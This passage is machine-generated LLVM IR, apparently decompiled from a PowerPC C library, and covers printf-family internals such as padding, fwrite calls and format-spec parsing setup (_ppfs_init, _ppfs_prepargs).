dec_label_pc_1000d4dc:                            ; preds = %dec_label_pc_1000d46c, %dec_label_pc_1000d4d0
  %v0_1000d4ec29 = phi i32 [ %v2_1000d470, %dec_label_pc_1000d46c ], [ 6, %dec_label_pc_1000d4d0 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000d4e8

dec_label_pc_1000d4e8thread-pre-split:            ; preds = %dec_label_pc_1000d420, %dec_label_pc_1000d47c, %dec_label_pc_1000d4c8, %dec_label_pc_1000d34c
  %v1_1000d4ec.pre = phi i32 [ %v2_1000d350, %dec_label_pc_1000d34c ], [ 0, %dec_label_pc_1000d4c8 ], [ %v1_1000d4ec.pre.pre, %dec_label_pc_1000d420 ], [ 0, %dec_label_pc_1000d47c ]
  %v0_1000d4ec.pre = phi i32 [ %v1_1000d2ac, %dec_label_pc_1000d34c ], [ %v0_1000d4ec.pre41, %dec_label_pc_1000d4c8 ], [ %v0_1000d4ec.pre.pre, %dec_label_pc_1000d420 ], [ 1, %dec_label_pc_1000d47c ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000d34c ], [ %stack_var_-184.0, %dec_label_pc_1000d4c8 ], [ %v0_1000d290, %dec_label_pc_1000d420 ], [ %v0_1000d290, %dec_label_pc_1000d47c ]
  %v0_1000d4e8.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000d4e8

dec_label_pc_1000d4e8:                            ; preds = %dec_label_pc_1000d4e8thread-pre-split, %dec_label_pc_1000d3ec, %dec_label_pc_1000d4dc
  %v1_1000d4ec = phi i32 [ %v1_1000d4ec.pre, %dec_label_pc_1000d4e8thread-pre-split ], [ 0, %dec_label_pc_1000d3ec ], [ 0, %dec_label_pc_1000d4dc ]
  %v0_1000d4ec = phi i32 [ %v0_1000d4ec.pre, %dec_label_pc_1000d4e8thread-pre-split ], [ %v0_1000d3dc, %dec_label_pc_1000d3ec ], [ %v0_1000d4ec29, %dec_label_pc_1000d4dc ]
  %v0_1000d4f4 = phi i32 [ %v0_1000d4e8.pr, %dec_label_pc_1000d4e8thread-pre-split ], [ 11, %dec_label_pc_1000d3ec ], [ 11, %dec_label_pc_1000d4dc ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000d4e8thread-pre-split ], [ %v0_1000d290, %dec_label_pc_1000d3ec ], [ %v0_1000d290, %dec_label_pc_1000d4dc ]
  %v3_1000d4e8 = icmp eq i32 %v0_1000d4f4, 11
  %v2_1000d4ec = add i32 %v0_1000d4ec, %v1_1000d4ec
  store i32 %v2_1000d4ec, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d4e8, label %dec_label_pc_1000d508, label %dec_label_pc_1000d4f4

dec_label_pc_1000d4f4:                            ; preds = %dec_label_pc_1000d4e8
  %v0_1000d4f8 = call i32 @__asm_mfcr()
  %v1_1000d4fc = call i32 @__asm_rlwinm(i32 %v0_1000d4f8, i32 30, i32 31, i32 31)
  %v1_1000d500 = add i32 %v1_1000d4fc, 1
  %v0_1000d504 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d504 = add i32 %v0_1000d504, %v1_1000d500
  store i32 %v2_1000d504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d508

dec_label_pc_1000d508:                            ; preds = %dec_label_pc_1000d4e8, %dec_label_pc_1000d4f4
  %v0_1000d520 = phi i32 [ %v2_1000d4ec, %dec_label_pc_1000d4e8 ], [ %v2_1000d504, %dec_label_pc_1000d4f4 ]
  %v3_1000d510 = icmp ugt i32 %tmp, %v0_1000d520
  br i1 %v3_1000d510, label %dec_label_pc_1000d518, label %dec_label_pc_1000d51c

dec_label_pc_1000d518:                            ; preds = %dec_label_pc_1000d508
  %v2_1000d518 = sub i32 %tmp, %v0_1000d520
  br label %dec_label_pc_1000d51c

dec_label_pc_1000d51c:                            ; preds = %dec_label_pc_1000d508, %dec_label_pc_1000d518
  %storemerge93 = phi i32 [ %v2_1000d518, %dec_label_pc_1000d518 ], [ 0, %dec_label_pc_1000d508 ]
  %v1_1000d52c = phi i32 [ %v2_1000d518, %dec_label_pc_1000d518 ], [ 0, %dec_label_pc_1000d508 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000d51c = load i32, i32* @r26, align 4
  %v3_1000d51c = icmp eq i32 %v0_1000d51c, 48
  %v2_1000d520 = add i32 %v1_1000d52c, %v0_1000d520
  store i32 %v2_1000d520, i32* %r0.global-to-local, align 4
  %v0_1000d524 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d524 = add i32 %v0_1000d524, %v2_1000d520
  store i32 %v2_1000d524, i32* %r23.global-to-local, align 4
  br i1 %v3_1000d51c, label %dec_label_pc_1000d52c, label %dec_label_pc_1000d534

dec_label_pc_1000d52c:                            ; preds = %dec_label_pc_1000d51c
  %v0_1000d52c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d52c = add i32 %v0_1000d52c, %v1_1000d52c
  store i32 %v2_1000d52c, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000d534

dec_label_pc_1000d534:                            ; preds = %dec_label_pc_1000d51c, %dec_label_pc_1000d52c
  %v0_1000d548 = phi i32 [ %v1_1000d52c, %dec_label_pc_1000d51c ], [ 0, %dec_label_pc_1000d52c ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000d538 = and i32 %stack_var_-184.1, 8
  %v3_1000d538 = icmp eq i32 %v1_1000d538, 0
  br i1 %v3_1000d538, label %dec_label_pc_1000d540, label %dec_label_pc_1000d55c

dec_label_pc_1000d540:                            ; preds = %dec_label_pc_1000d534
  %v0_1000d540 = load i32, i32* %r24.global-to-local, align 4
  store i32 268490064, i32* @lr, align 4
  %v4_1000d54c = call i32 @_charpad(i32 %v0_1000d540, i8 32, i32 %v0_1000d548)
  %v1_1000d550 = load i32, i32* @r28, align 4
  %v4_1000d550 = icmp eq i32 %v4_1000d54c, %v1_1000d550
  br i1 %v4_1000d550, label %dec_label_pc_1000d558, label %dec_label_pc_1000d64c

dec_label_pc_1000d558:                            ; preds = %dec_label_pc_1000d540
  br label %dec_label_pc_1000d55c

dec_label_pc_1000d55c:                            ; preds = %dec_label_pc_1000d534, %dec_label_pc_1000d558
  %v0_1000d560 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d568 = load i32, i32* @r27, align 4
  %v2_1000d568 = add i32 %v0_1000d568, ptrtoint (i32* @global_var_10016b70.602 to i32)
  store i32 268490096, i32* @lr, align 4
  %v2_1000d56c = call i32 @__GI_fputs_unlocked(i32 %v2_1000d568, i32 %v0_1000d560)
  %v0_1000d578 = load i32, i32* @r29, align 4
  store i32 268490112, i32* @lr, align 4
  %v4_1000d57c = call i32 @_charpad(i32 %v0_1000d560, i8 48, i32 %v0_1000d578)
  %v1_1000d580 = load i32, i32* @r29, align 4
  %v4_1000d580 = icmp eq i32 %v4_1000d57c, %v1_1000d580
  br i1 %v4_1000d580, label %dec_label_pc_1000d588, label %dec_label_pc_1000d64c

dec_label_pc_1000d588:                            ; preds = %dec_label_pc_1000d55c
  %v3_1000d588 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000d588, i32* %r0.global-to-local, align 4
  %v3_1000d58c = icmp eq i32 %v3_1000d588, 0
  br i1 %v3_1000d58c, label %dec_label_pc_1000d594, label %dec_label_pc_1000d5bc

dec_label_pc_1000d594:                            ; preds = %dec_label_pc_1000d588
  %v0_1000d594 = load i32, i32* @r31, align 4
  %v3_1000d594 = icmp eq i32 %v0_1000d594, 0
  br i1 %v3_1000d594, label %dec_label_pc_1000d5b0.thread, label %dec_label_pc_1000d5b0

dec_label_pc_1000d5b0.thread:                     ; preds = %dec_label_pc_1000d594
  br label %dec_label_pc_1000d620

dec_label_pc_1000d5b0:                            ; preds = %dec_label_pc_1000d594
  %v0_1000d5a0 = load i32, i32* @r30, align 4
  %v0_1000d5a8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268490160, i32* @lr, align 4
  %v4_1000d5ac = inttoptr i32 %v0_1000d5a8 to i16*
  %v5_1000d5ac = call i32 @__stdio_fwrite(i32 %v0_1000d5a0, i32 %v0_1000d594, i16* %v4_1000d5ac)
  %v1_1000d5b0.pre = load i32, i32* @r31, align 4
  %v4_1000d5b0 = icmp eq i32 %v5_1000d5ac, %v1_1000d5b0.pre
  br i1 %v4_1000d5b0, label %dec_label_pc_1000d620, label %dec_label_pc_1000d64c

dec_label_pc_1000d5bc:                            ; preds = %dec_label_pc_1000d588
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000d600.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d600

dec_label_pc_1000d5c8:                            ; preds = %dec_label_pc_1000d600
  %tmp78 = icmp ult i32 %v0_1000d618, 129
  br i1 %tmp78, label %dec_label_pc_1000d5d0, label %dec_label_pc_1000d5cc

dec_label_pc_1000d5cc:                            ; preds = %dec_label_pc_1000d5c8
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000d5d0

dec_label_pc_1000d5d0:                            ; preds = %dec_label_pc_1000d5c8, %dec_label_pc_1000d5cc
  store i32 ptrtoint (i32* @global_var_1000d5d4.603 to i32), i32* @lr, align 4
  %v0_1000d5d0 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d5d0, i32* @r30, align 4
  %v3_1000d5d8 = icmp eq i32 %v0_1000d5d0, 0
  br i1 %v3_1000d5d8, label %dec_label_pc_1000d5f4, label %dec_label_pc_1000d5ec

dec_label_pc_1000d5ec:                            ; preds = %dec_label_pc_1000d5d0
  %v0_1000d5dc = load i32, i32* %r24.global-to-local, align 4
  store i32 268490224, i32* @lr, align 4
  %v3_1000d5ec = inttoptr i32 %v0_1000d5dc to i16*
  %v4_1000d5ec = call i32 @__stdio_fwrite(i32 %v2_1000d4b0, i32 %v0_1000d5d0, i16* %v3_1000d5ec)
  store i32 %v4_1000d5ec, i32* %r0.global-to-local, align 4
  %v1_1000d5f4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d5f4

dec_label_pc_1000d5f4:                            ; preds = %dec_label_pc_1000d5d0, %dec_label_pc_1000d5ec
  %v1_1000d5f4 = phi i32 [ 0, %dec_label_pc_1000d5d0 ], [ %v1_1000d5f4.pre, %dec_label_pc_1000d5ec ]
  %v0_1000d5f8 = phi i32 [ 0, %dec_label_pc_1000d5d0 ], [ %v4_1000d5ec, %dec_label_pc_1000d5ec ]
  %v4_1000d5f4 = icmp eq i32 %v0_1000d5f8, %v1_1000d5f4
  %v1_1000d5f8 = load i32, i32* @r31, align 4
  %v2_1000d5f8 = sub i32 %v1_1000d5f8, %v0_1000d5f8
  store i32 %v2_1000d5f8, i32* @r31, align 4
  br i1 %v4_1000d5f4, label %dec_label_pc_1000d600, label %dec_label_pc_1000d64c

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5f4, %dec_label_pc_1000d5bc
  %v0_1000d618 = phi i32 [ %v2_1000d5f8, %dec_label_pc_1000d5f4 ], [ %v0_1000d600.pre, %dec_label_pc_1000d5bc ]
  %v3_1000d600 = icmp eq i32 %v0_1000d618, 0
  store i32 %v2_1000d4b0, i32* @r29, align 4
  store i32 %v2_1000d3d0, i32* @r4, align 4
  store i32 %v2_1000d3d4, i32* @r6, align 4
  store i32 %v2_1000d4b0, i32* @r3, align 4
  store i32 %v0_1000d618, i32* @r5, align 4
  br i1 %v3_1000d600, label %dec_label_pc_1000d620, label %dec_label_pc_1000d5c8

dec_label_pc_1000d620:                            ; preds = %dec_label_pc_1000d600, %dec_label_pc_1000d5b0.thread, %dec_label_pc_1000d5b0
  %v0_1000d620 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d628 = load i32, i32* @r28, align 4
  store i32 268490288, i32* @lr, align 4
  %v4_1000d62c = call i32 @_charpad(i32 %v0_1000d620, i8 32, i32 %v0_1000d628)
  %v1_1000d630 = load i32, i32* @r28, align 4
  %v4_1000d630 = icmp eq i32 %v4_1000d62c, %v1_1000d630
  br i1 %v4_1000d630, label %dec_label_pc_1000d638, label %dec_label_pc_1000d64c

dec_label_pc_1000d638:                            ; preds = %dec_label_pc_1000d620, %dec_label_pc_1000d388, %dec_label_pc_1000d15c
  %stack_var_-184.2 = phi i32 [ %v0_1000d290, %dec_label_pc_1000d15c ], [ %stack_var_-184.1, %dec_label_pc_1000d620 ], [ %v0_1000d290, %dec_label_pc_1000d388 ]
  %v3_1000d638 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000d638 = ptrtoint i8* %v3_1000d638 to i32
  store i32 %v4_1000d638, i32* @r29, align 4
  br label %dec_label_pc_1000d63c

dec_label_pc_1000d63c:                            ; preds = %dec_label_pc_1000d050, %dec_label_pc_1000d638
  %v0_1000d63c = phi i32 [ %v0_1000d63c.pre, %dec_label_pc_1000d050 ], [ %v4_1000d638, %dec_label_pc_1000d638 ]
  %v0_1000d290 = phi i32 [ %tmp56, %dec_label_pc_1000d050 ], [ %stack_var_-184.2, %dec_label_pc_1000d638 ]
  br label %dec_label_pc_1000d068

dec_label_pc_1000d64c:                            ; preds = %dec_label_pc_1000d4a4, %dec_label_pc_1000d620, %dec_label_pc_1000d5b0, %dec_label_pc_1000d55c, %dec_label_pc_1000d540, %dec_label_pc_1000d400, %dec_label_pc_1000d3d0, %dec_label_pc_1000d364, %dec_label_pc_1000d0a4, %dec_label_pc_1000d5f4
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000d650

dec_label_pc_1000d650:                            ; preds = %dec_label_pc_1000d0b0, %dec_label_pc_1000d028, %dec_label_pc_1000d040, %dec_label_pc_1000d64c
  store i32 %v0_1000cffc, i32* %r0.global-to-local, align 4
  %v0_1000d654 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000d654

; uselistorder directives
  uselistorder i32 %v0_1000d290, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000d618, { 1, 2, 0 }
  uselistorder i32 %v1_1000d52c, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000d4bc, { 1, 0 }
  uselistorder i32 %v2_1000d44c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000d3ac, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000d290, { 1, 0 }
  uselistorder i32 %v6_1000d248, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_1000d218, { 1, 0 }
  uselistorder i32 %v1_1000d1bc, { 1, 0 }
  uselistorder i1 %v2_1000d1b0, { 1, 0 }
  uselistorder i32 %v0_1000d160, { 1, 0, 2 }
  uselistorder i32 %v1_1000d14c, { 1, 0 }
  uselistorder i32 %v0_1000d144, { 1, 0 }
  uselistorder i32 %v1_1000d140, { 1, 0 }
  uselistorder i32 %v1_1000d0bc, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000d084, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000d094, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000d4b0, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000d0f8, { 1, 2, 0 }
  uselistorder i32 %v4_1000d0f0, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 37, 0, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 1, 3, 4, 0, 5, 2 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_1000d650, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d64c, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000d63c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d620, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d5f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d55c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d534, { 1, 0 }
  uselistorder label %dec_label_pc_1000d51c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d508, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d4e8thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d4dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d46c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d458, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d320, { 1, 0 }
  uselistorder label %dec_label_pc_1000d308, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000d2b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d29c, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000d228, { 1, 0 }
  uselistorder label %dec_label_pc_1000d20c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d1c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d150, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000d13c.dec_label_pc_1000d13c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d114, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d068, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000d66c = load i32, i32* @lr, align 4
  store i32 %v0_1000d66c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000d67c = load i32, i32* @r4, align 4
  store i32 %v0_1000d67c, i32* @r30, align 4
  store i32 268490380, i32* @lr, align 4
  %v3_1000d688 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000d68c = load i32, i32* @r31, align 4
  %v1_1000d68c = add i32 %v0_1000d68c, 24
  %v2_1000d68c = inttoptr i32 %v1_1000d68c to i32*
  %v3_1000d68c = load i32, i32* %v2_1000d68c, align 4
  store i32 %v3_1000d68c, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000d694 = load i32, i32* @r30, align 4
  %v2_1000d694 = inttoptr i32 %v0_1000d68c to i32*
  store i32 %v0_1000d694, i32* %v2_1000d694, align 4
  %v0_1000d698 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000d698, i32* %ctr.global-to-local, align 4
  %v0_1000d69c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d69c = add i32 %v0_1000d69c, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000d6a4 = load i32, i32* @r31, align 4
  %v2_1000d6a4 = add i32 %v1_1000d6a4, 24
  %v3_1000d6a4 = inttoptr i32 %v2_1000d6a4 to i32*
  store i32 %v1_1000d69c, i32* %v3_1000d6a4, align 4
  %v0_1000d6a8 = load i32, i32* @r31, align 4
  %v1_1000d6a8 = add i32 %v0_1000d6a8, 40
  store i32 %v1_1000d6a8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d6ac

dec_label_pc_1000d6ac:                            ; preds = %dec_label_pc_1000d6ac, %entry
  %v1_1000d6ac = phi i32 [ %v1_1000d6b0, %dec_label_pc_1000d6ac ], [ %v1_1000d6a8, %entry ]
  %v0_1000d6ac = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d6ac = inttoptr i32 %v1_1000d6ac to i32*
  store i32 %v0_1000d6ac, i32* %v2_1000d6ac, align 4
  %v0_1000d6b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d6b0 = add i32 %v0_1000d6b0, 4
  store i32 %v1_1000d6b0, i32* %r9.global-to-local, align 4
  %v0_1000d6b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d6b4 = add i32 %v0_1000d6b4, -1
  store i32 %v1_1000d6b4, i32* %ctr.global-to-local, align 4
  %v2_1000d6b4 = icmp eq i32 %v1_1000d6b4, 0
  br i1 %v2_1000d6b4, label %dec_label_pc_1000d6b8, label %dec_label_pc_1000d6ac

dec_label_pc_1000d6b8:                            ; preds = %dec_label_pc_1000d6ac
  %v0_1000d6b8 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d6f8

dec_label_pc_1000d6c8:                            ; preds = %dec_label_pc_1000d6f8
  %v3_1000d700 = icmp eq i8 %v2_1000d6f8, 37
  br i1 %v3_1000d700, label %dec_label_pc_1000d6cc, label %dec_label_pc_1000d6f4

dec_label_pc_1000d6cc:                            ; preds = %dec_label_pc_1000d6c8
  %v1_1000d6cc = add i32 %v0_1000d6cc, 1
  %v2_1000d6cc = inttoptr i32 %v1_1000d6cc to i8*
  %v3_1000d6cc = load i8, i8* %v2_1000d6cc, align 1
  %v4_1000d6cc = zext i8 %v3_1000d6cc to i32
  store i32 %v4_1000d6cc, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d6cc, i32* %r9.global-to-local, align 4
  %v3_1000d6d4 = icmp eq i8 %v3_1000d6cc, 37
  br i1 %v3_1000d6d4, label %dec_label_pc_1000d6f4, label %dec_label_pc_1000d6dc

dec_label_pc_1000d6dc:                            ; preds = %dec_label_pc_1000d6cc
  %v0_1000d6d0 = load i32, i32* @r31, align 4
  %v2_1000d6dc = inttoptr i32 %v0_1000d6d0 to i32*
  store i32 %v1_1000d6cc, i32* %v2_1000d6dc, align 4
  store i32 268490468, i32* @lr, align 4
  %v1_1000d6e0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d6e0 = call i32 @_ppfs_parsespec(i32* %v2_1000d6dc, i32 %v1_1000d6e0)
  %v1_1000d6e4 = icmp slt i32 %v3_1000d6e0, 0
  br i1 %v1_1000d6e4, label %dec_label_pc_1000d710, label %dec_label_pc_1000d6ec

dec_label_pc_1000d6ec:                            ; preds = %dec_label_pc_1000d6dc
  %v0_1000d6ec = load i32, i32* @r31, align 4
  %v1_1000d6ec = inttoptr i32 %v0_1000d6ec to i32*
  %v2_1000d6ec = load i32, i32* %v1_1000d6ec, align 4
  br label %dec_label_pc_1000d6f8

dec_label_pc_1000d6f4:                            ; preds = %dec_label_pc_1000d6c8, %dec_label_pc_1000d6cc
  %v0_1000d6f4 = phi i32 [ %v0_1000d6cc, %dec_label_pc_1000d6c8 ], [ %v1_1000d6cc, %dec_label_pc_1000d6cc ]
  %v1_1000d6f4 = add i32 %v0_1000d6f4, 1
  br label %dec_label_pc_1000d6f8

dec_label_pc_1000d6f8:                            ; preds = %dec_label_pc_1000d6ec, %dec_label_pc_1000d6f4, %dec_label_pc_1000d6b8
  %v0_1000d6cc = phi i32 [ %v0_1000d6b8, %dec_label_pc_1000d6b8 ], [ %v1_1000d6f4, %dec_label_pc_1000d6f4 ], [ %v2_1000d6ec, %dec_label_pc_1000d6ec ]
  store i32 %v0_1000d6cc, i32* %r9.global-to-local, align 4
  %v1_1000d6f8 = inttoptr i32 %v0_1000d6cc to i8*
  %v2_1000d6f8 = load i8, i8* %v1_1000d6f8, align 1
  %v3_1000d6f8 = zext i8 %v2_1000d6f8 to i32
  store i32 %v3_1000d6f8, i32* %r0.global-to-local, align 4
  %v3_1000d6fc = icmp eq i8 %v2_1000d6f8, 0
  br i1 %v3_1000d6fc, label %dec_label_pc_1000d708, label %dec_label_pc_1000d6c8

dec_label_pc_1000d708:                            ; preds = %dec_label_pc_1000d6f8
  %v0_1000d708 = load i32, i32* @r30, align 4
  %v1_1000d708 = load i32, i32* @r31, align 4
  %v2_1000d708 = inttoptr i32 %v1_1000d708 to i32*
  store i32 %v0_1000d708, i32* %v2_1000d708, align 4
  br label %dec_label_pc_1000d710

dec_label_pc_1000d710:                            ; preds = %dec_label_pc_1000d6dc, %dec_label_pc_1000d708
  %storemerge = phi i32 [ 0, %dec_label_pc_1000d708 ], [ -1, %dec_label_pc_1000d6dc ]
  store i32 %v0_1000d66c, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000d6f8, { 1, 2, 0 }
  uselistorder i32 %v0_1000d6cc, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000d6b4, { 1, 0 }
  uselistorder i32 %v1_1000d6b0, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000d710, { 1, 0 }
  uselistorder label %dec_label_pc_1000d6f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d6f4, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000d724 = load i32, i32* @lr, align 4
  %v0_1000d72c = load i32, i32* @r3, align 4
  store i32 %v0_1000d72c, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d748 = add i32 %v0_1000d72c, 24
  %v2_1000d748 = inttoptr i32 %v1_1000d748 to i32*
  %v3_1000d748 = load i32, i32* %v2_1000d748, align 4
  store i32 %v3_1000d748, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000d748, 1
  br i1 %tmp4, label %dec_label_pc_1000d76c, label %dec_label_pc_1000d754

dec_label_pc_1000d754:                            ; preds = %entry
  %v2_1000d754 = add i32 %v0_1000d72c, 8
  %v3_1000d754 = inttoptr i32 %v2_1000d754 to i32*
  store i32 0, i32* %v3_1000d754, align 4
  %v0_1000d758 = load i32, i32* @r30, align 4
  %v1_1000d758 = load i32, i32* @r3, align 4
  %v2_1000d758 = add i32 %v1_1000d758, 28
  %v3_1000d758 = inttoptr i32 %v2_1000d758 to i32*
  store i32 %v0_1000d758, i32* %v3_1000d758, align 4
  %v0_1000d75c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d75c = load i32, i32* @r3, align 4
  %v2_1000d75c = add i32 %v1_1000d75c, 24
  %v3_1000d75c = inttoptr i32 %v2_1000d75c to i32*
  store i32 %v0_1000d75c, i32* %v3_1000d75c, align 4
  %v0_1000d760 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d760 = load i32, i32* @r3, align 4
  %v2_1000d760 = add i32 %v1_1000d760, 4
  %v3_1000d760 = inttoptr i32 %v2_1000d760 to i32*
  store i32 %v0_1000d760, i32* %v3_1000d760, align 4
  store i32 268490600, i32* @lr, align 4
  %v0_1000d764 = call i32 @_ppfs_setargs()
  store i32 %v0_1000d764, i32* %r3.global-to-local, align 4
  %v0_1000d768 = load i32, i32* @r30, align 4
  %v1_1000d768 = load i32, i32* @r31, align 4
  %v2_1000d768 = add i32 %v1_1000d768, 24
  %v3_1000d768 = inttoptr i32 %v2_1000d768 to i32*
  store i32 %v0_1000d768, i32* %v3_1000d768, align 4
  %v0_1000d77c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d76c

dec_label_pc_1000d76c:                            ; preds = %entry, %dec_label_pc_1000d754
  %v0_1000d77c = phi i32 [ %v0_1000d72c, %entry ], [ %v0_1000d77c.pre, %dec_label_pc_1000d754 ]
  store i32 %v0_1000d724, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d77c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000d76c, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
